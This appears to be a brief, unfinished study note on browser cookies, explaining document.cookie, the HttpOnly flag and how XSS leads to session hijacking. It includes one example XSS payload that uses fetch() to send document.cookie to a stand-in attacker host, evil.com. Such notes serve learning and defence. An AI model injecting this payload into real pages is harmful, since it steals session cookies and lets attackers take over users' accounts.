1. Use of `document.cookie`?
- Used by JS to perform CRUD operation of cookies.
- Eg. `Set-Cookie: session=XYZ123abc; HttpOnly; Secure; SameSite=Strict`
- Session IDs (sessionid, JSESSIONID, etc.), Auth tokens, Anything related to authentication or privileges.
- HttpOnly cookies not return by document.cookie & makes cookies invisible to JavaScript.

```
If The website is vulnerable to XSS, The session/auth cookies are not marked HttpOnly leads to Session Hijack.

Payloads:
<script>
fetch('https://evil.com/log?cookie=' + document.cookie);
</script>

```

2. 


